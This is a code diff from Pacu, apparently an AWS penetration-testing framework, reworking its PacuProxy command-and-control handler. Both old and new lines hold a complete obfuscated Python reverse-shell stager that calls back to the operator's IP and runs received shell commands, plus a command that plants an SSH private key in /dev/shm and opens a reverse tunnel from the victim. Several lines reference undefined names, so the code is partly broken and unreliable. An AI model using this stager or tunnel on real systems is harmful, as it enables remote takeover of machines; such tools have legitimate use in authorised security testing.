@@ -340,10 +340,11 @@ class util(object):
         with the alias exists, an exception will be raised. """
         return database.query(AWSKey).filter(AWSKey.key_alias == alias).scalar()
 
-def start_proxy(database):
-    create_workers(database)
-    create_jobs()
-    return
+def start_proxy(queue, database):
+    proxy_db = PacuProxyData.get_proxy_data(database)
+    server = create_workers(queue, proxy_db.ip, proxy_db.port)
+    create_jobs(queue)
+    return server
 
 # Create the proxy threads
 def create_workers(database):
@@ -469,16 +470,16 @@ def get_ssh_key(proxy_data, database):
         return proxy_data
 
 
-def parse_command(command, database):
+def parse_command(command, server, queue, database):
     session = PacuSession.get_active_session(database)
 
     command = command.strip()
     command = command.split(' ')
 
     if command[0] == '':
-        return
+        return server, queue
     elif cmd[0] == 'proxy':
-        proxy = PacuProxyData.get_proxy_data(database)
+        proxy_db = PacuProxyData.get_proxy_data(database)
         proxy_data = copy.deepcopy(proxy)
         if len(cmd) == 1: # Display proxy help
             print("""
@@ -499,82 +500,82 @@ def parse_command(command, database):
                                                   command-line escaping is done for valid syntax.
 """)
         elif cmd[1] == 'start': # Start proxy server
-            if proxy_data['listening'] is False:
+            if proxy_data.listening is False:
                 if len(cmd) == 4:
-                    proxy_data['port'] = cmd[3]
+                    proxy_data.port = cmd[3]
                 else:
-                    proxy_data['port'] = 80
-                proxy_data['ip'] = cmd[2]
-                print('Starting PacuProxy on {}:{}...'.format(proxy_data['ip'], proxy_data['port']))
-                start_proxy(database)
-                proxy.update(database, Proxy=proxy_data)
-                return
+                    proxy_data.port = 80
+                proxy_data.ip = cmd[2]
+                print('Starting PacuProxy on {}:{}...'.format(proxy_data.ip, proxy_data.port))
+                proxy_db.update(database, Proxy=proxy_data)
+                server = start_proxy(queue, database)
+                return server, queue
             else:
-                print('There already seems to be a listener running: {}'.format(global_config['Proxy']))
+                print('There already seems to be a listener running: {}'.format(server))
         elif cmd[1] == 'list' or cmd[1] == 'ls': # List active agent connections
-            global_config['Proxy'].list_connections(database)
+            server.list_connections()
         elif cmd[1] == 'shell' and len(cmd) > 3: # Run shell command on an agent  
-            global_config['Proxy'].run_cmd(int(cmd[2]), global_config['Proxy'].all_connections[int(cmd[2])], ' '.join(cmd[3:]))
+            server.run_cmd(int(cmd[2]), server.all_connections[int(cmd[2])], ' '.join(cmd[3:]))
         elif cmd[1] == 'stop': # Stop proxy server
-            if proxy_data['listening'] is False:
+            if proxy_data.listening is False:
                 print('There does not seem to be a listener running currently.')
             else:
-                global_config['Proxy'].quit_gracefully(database)
+                server.quit_gracefully()
                 queue.put(5)
-                global_config['Proxy'] = None
-                proxy_data['listening'] = False
-                proxy_data['target_agent'] = []
+                server = None
+                proxy_data.listening = False
+                proxy_data.target_agent = []
         elif cmd[1] == 'kill': # Kill an agent connection
             if len(cmd) == 3:
-                print('** Killing agent {}... **'.format(int(cmd[2])))
-                global_config['Proxy'].quit(int(cmd[2]), global_config['Proxy'].all_connections[int(cmd[2])])
-                print('** Agent killed **')
+                util.print('** Killing agent {}... **'.format(int(cmd[2])), database)
+                server.quit(int(cmd[2]), server.all_connections[int(cmd[2])])
+                util.print('** Agent killed **', database)
             elif len(cmd) == 2:
                 print(' ** Incorrect input, excepted an agent ID, received nothing. Use format: proxy kill <agent_id> **')
             else:
                 print('** Incorrect input, excepted an agent ID, received: {}'.format(cmd[2:]))
         elif cmd[1] == 'stager':
             if len(cmd) == 3:
-                python_stager = "import os,socket as E,subprocess as B,time as t,sys,struct as D\\nclass A(object):\\n  def __init__(self):\\n    self.S='{}'\\n    self.p={}\\n    self.s=None\\n  def b(self):\\n    try:\\n      self.s=E.socket()\\n    except:\\n      pass\\n    return\\n  def c(self):\\n    try:\\n      self.s.connect((self.S,self.p))\\n    except:\\n      t.sleep(5)\\n      raise\\n    try:\\n      self.s.send(E.gethostname().encode('ascii'))\\n    except:\\n      pass\\n    return\\n  def d(self,R):\\n    Q=R.encode('ascii')\\n    self.s.send(D.pack('>I',len(Q))+Q)\\n    return\\n  def e(self):\\n    try:\\n      self.s.recv(10)\\n    except:\\n      return\\n    self.s.send(D.pack('>I',0))\\n    while True:\\n      R=None\\n      U=self.s.recv(20480)\\n      if U==b'': break\\n      elif U[:2].decode('utf-8')=='cd':\\n        P=U[3:].decode('utf-8')\\n        try:\\n          os.chdir(P.strip())\\n        except Exception as e:\\n          R='Err: %s\\\n'%str(e)\\n        else:\\n          R=''\\n      elif U[:].decode('utf-8')=='q':\\n        self.s.close()\\n        sys.exit(0)\\n      elif len(U)>0:\\n        try:\\n          T=B.Popen(U[:].decode('utf-8'),shell=True,stdout=B.PIPE,stderr=B.PIPE,stdin=B.PIPE)\\n          M=T.stdout.read()+T.stderr.read()\\n          R=M.decode('utf-8',errors='replace')\\n        except Exception as e:\\n          R='Err:%s\\\n'%str(e)\\n      if R is not None:\\n        try:\\n          self.d(R)\\n        except:\\n          pass\\n    self.s.close()\\n    return\\ndef f():\\n  C=A()\\n  C.b()\\n  while True:\\n    try:\\n      C.c()\\n    except Exception as e:\\n      t.sleep(5)\\n    else:\\n      break\\n  try:\\n    C.e()\\n  except:\\n    pass\\n  C.s.close()\\n  return\\nsys.stderr=object\\nwhile True:\\n  f()".format(proxy_data['ip'], proxy_data['port'])
+                python_stager = "import os,socket as E,subprocess as B,time as t,sys,struct as D\\nclass A(object):\\n  def __init__(self):\\n    self.S='{}'\\n    self.p={}\\n    self.s=None\\n  def b(self):\\n    try:\\n      self.s=E.socket()\\n    except:\\n      pass\\n    return\\n  def c(self):\\n    try:\\n      self.s.connect((self.S,self.p))\\n    except:\\n      t.sleep(5)\\n      raise\\n    try:\\n      self.s.send(E.gethostname().encode('ascii'))\\n    except:\\n      pass\\n    return\\n  def d(self,R):\\n    Q=R.encode('ascii')\\n    self.s.send(D.pack('>I',len(Q))+Q)\\n    return\\n  def e(self):\\n    try:\\n      self.s.recv(10)\\n    except:\\n      return\\n    self.s.send(D.pack('>I',0))\\n    while True:\\n      R=None\\n      U=self.s.recv(20480)\\n      if U==b'': break\\n      elif U[:2].decode('utf-8')=='cd':\\n        P=U[3:].decode('utf-8')\\n        try:\\n          os.chdir(P.strip())\\n        except Exception as e:\\n          R='Err: %s\\\n'%str(e)\\n        else:\\n          R=''\\n      elif U[:].decode('utf-8')=='q':\\n        self.s.close()\\n        sys.exit(0)\\n      elif len(U)>0:\\n        try:\\n          T=B.Popen(U[:].decode('utf-8'),shell=True,stdout=B.PIPE,stderr=B.PIPE,stdin=B.PIPE)\\n          M=T.stdout.read()+T.stderr.read()\\n          R=M.decode('utf-8',errors='replace')\\n        except Exception as e:\\n          R='Err:%s\\\n'%str(e)\\n      if R is not None:\\n        try:\\n          self.d(R)\\n        except:\\n          pass\\n    self.s.close()\\n    return\\ndef f():\\n  C=A()\\n  C.b()\\n  while True:\\n    try:\\n      C.c()\\n    except Exception as e:\\n      t.sleep(5)\\n    else:\\n      break\\n  try:\\n    C.e()\\n  except:\\n    pass\\n  C.s.close()\\n  return\\nsys.stderr=object\\nwhile True:\\n  f()".format(proxy_data.ip, proxy_data.port)
                 if cmd[2] == 'lin': # Linux one-liner (uses \" to escape inline double-quotes)
-                    print('python3 -c "{}"'.format("exec(\\\"\\\"\\\"{}\\\"\\\"\\\")".format(python_stager)))
+                    util.print('python3 -c "{}"'.format("exec(\\\"\\\"\\\"{}\\\"\\\"\\\")".format(python_stager)), database)
                 elif cmd[2] == 'win': # Windows one-liner (uses `" to escape inline double-quotes)
-                    print('python3 -c "{}"'.format("exec(`\"`\"`\"{}`\"`\"`\")".format(python_stager)))
+                    util.print('python3 -c "{}"'.format("exec(`\"`\"`\"{}`\"`\"`\")".format(python_stager)), database)
                 else:
-                    print('** Incorrect input, expected target operating system ("win" or "lin"), received: {}'.format(cmd[2:]))
+                    util.print('** Incorrect input, expected target operating system ("win" or "lin"), received: {}'.format(cmd[2:]), database)
             else:
-                print('** Incorrect input, expected target operating system ("win" or "lin"), received: {}'.format(cmd[2:]))
+                util.print('** Incorrect input, expected target operating system ("win" or "lin"), received: {}'.format(cmd[2:]), database)
         elif cmd[1] == 'use':
             if len(cmd) == 3:
                 try:
                     if cmd[2] == 'none':
-                        print('No longer using a remote PacuProxy agent to route commands...')
-                        proxy_data['target_agent'] = []
+                        util.print('No longer using a remote PacuProxy agent to route commands...', database)
+                        proxy_data.target_agent = []
                     else:
                         print('Setting proxy target to agent {}...'.format(cmd[2]))
 
                         # Find or create an SSH user
                         proxy_data = get_ssh_user(proxy_data, database)
-                        if proxy_data['ssh_username'] is None:
+                        if proxy_data.ssh_username is None:
                             util.print('No SSH user on the local PacuProxy server, not routing traffic through the target agent.', database)
-                            proxy.update(database, Proxy=proxy_data)
-                            return
+                            proxy_db.update(database, Proxy=proxy_data)
+                            return server, queue
 
                         restart = False
-                        if proxy_data['ssh_priv_key'] is None or proxy_data['ssh_priv_key'] == '':
+                        if proxy_data.ssh_priv_key is None or proxy_data.ssh_priv_key == '':
                             restart = True
 
                         # Find or generate an SSH key for that user
                         proxy_data = get_ssh_key(proxy_data, database)
-                        if proxy_data['ssh_priv_key'] is None:
-                            util.print('No SSH key for user {}, not routing traffic through the target agent.'.format(proxy_data['ssh_username']), database)
-                            proxy.update(database, Proxy=proxy_data)
-                            return
+                        if proxy_data.ssh_priv_key is None:
+                            util.print('No SSH key for user {}, not routing traffic through the target agent.'.format(proxy_data.ssh_username), database)
+                            proxy_db.update(database, Proxy=proxy_data)
+                            return server, queue
 
                         # If an SSH key was just generated, make sure local port forwarding is disabled
                         if restart is True:
                             util.print('SSH user setup successfully. It is highly recommended to restart your sshd service before continuing. Part of the SSH user creation process was to restrict access to local port forwarding, but this change requires an sshd restart. If local port forwarding is not disabled, your target machine can "hack back" by forwarding your local ports to their machine and accessing the services hosted on them. This can be done by running "service sshd restart".\n', database)
-                            proxy.update(database, Proxy=proxy_data)
+                            proxy_db.update(database, Proxy=proxy_data)
                             restart_sshd = util.input('  Do you want Pacu to restart sshd (Warning: If you are currently connected to your server over SSH, you may lose your connection)? Press enter if so, enter "ignore" to ignore this warning, or press Ctrl+C to exit and restart it yourself (Enter/ignore/Ctrl+C): ', database)
 
                             if restart_sshd == 'ignore':
@@ -583,15 +584,17 @@ def parse_command(command, database):
                                 util.print('Restarting sshd...', database)
                                 subprocess.run('service sshd restart', shell=True)
 
-                        proxy_data['target_agent'] = int(cmd[2])
+                        util.print('Telling remote agent to connect back...', database)
+                        proxy_data.target_agent = server.all_addresses[int(cmd[2])]
                         shm_name = ''.join(random.choices(string.ascii_lowercase + string.ascii_digits, k=int(''.join(random.choices('3456789', k=1)))))
-                        connect_back_cmd = 'echo "{}" > /dev/shm/{} && chmod 600 /dev/shm/{} && ssh -i /dev/shm/{} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -f -N -R 8000 {}@{} >/dev/null 2>&1'.format(proxy_data['ssh_priv_key'], shm_name, shm_name, shm_name, proxy_data['ssh_username'], proxy_data['ip'])
-                        global_config['Proxy'].run_cmd(proxy_data['target_agent'][0], global_config['Proxy'].all_connections[int(cmd[2])], connect_back_cmd)
+                        connect_back_cmd = 'echo "{}" > /dev/shm/{} && chmod 600 /dev/shm/{} && ssh -i /dev/shm/{} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -f -N -R 8000 {}@{} >/dev/null 2>&1'.format(proxy_data.ssh_priv_key, shm_name, shm_name, shm_name, proxy_data.ssh_username, proxy_data.ip)
+                        server.run_cmd(proxy_data.target_agent[0], server.all_connections[int(cmd[2])], connect_back_cmd)
                 except:
-                    print('** Invalid agent ID, expected an integer or "none", received: {}'.format(cmd[2]))
+                    util.print('** Invalid agent ID, expected an integer or "none", received: {}'.format(cmd[2]), database)
             else:
-                print('** Incorrect input, excepted an agent ID, received: {}'.format(cmd[2:]))
-        proxy.update(database, Proxy=proxy_data)
+                util.print('** Incorrect input, excepted an agent ID, received: {}'.format(cmd[2:]), database)
+        proxy_db.update(database, Proxy=proxy_data)
+        return server, queue
     elif (command[0] == 'run' or command[0] == 'exec') and len(command) > 1:
         exec_module(command, database)
     elif command[0] == 'list' or command[0] == 'ls':
@@ -625,10 +628,10 @@ def parse_command(command, database):
             if region.lower() == 'all':
                 session.update(database, session_regions=['all'])
                 print('  The region set for this session has been reset to the default of all supported regions.')
-                return
+                return server, queue
             if util.validate_region(region, database) is False:
                 print('  {} is not a valid region.\n  Session regions not changed.'.format(region))
-                return
+                return server, queue
         session.update(database, session_regions=command[1:])
         print('  The region set for this session has been changed: {}'.format(session.session_regions))
     elif command[0] == 'services':
@@ -640,7 +643,7 @@ def parse_command(command, database):
             print('  {}'.format(region))
     else:
         print('  Error: Unrecognized command')
-    return
+    return server, queue
 
 
 def import_module_by_name(module_name, include=()):
